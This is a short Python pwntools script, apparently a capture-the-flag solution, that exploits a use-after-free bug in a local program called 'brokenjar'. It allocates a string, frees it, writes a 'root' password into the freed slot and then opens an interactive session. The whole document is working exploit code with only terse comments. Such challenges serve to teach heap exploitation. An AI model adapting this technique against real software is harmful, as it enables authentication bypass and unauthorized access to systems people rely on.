from pwn import *

target = process("./brokenjar")

"""
Allocating 4 bytes with a string "toor". The string could be 
whatever as long as it has 4 bytes (4 chars).
"""
target.sendline("1")
target.sendline("0")
target.sendline("4")
target.sendline("toor")

"""
User after free is in this section.
"""
target.sendline("4")
target.sendline("0")

"""
Let's create a password with "root" as string into the index 0
"""
target.sendline("2")
target.sendline("0")
target.sendline("4")
target.sendline("root")

"""
Pwned
"""
target.sendline("5")
target.interactive()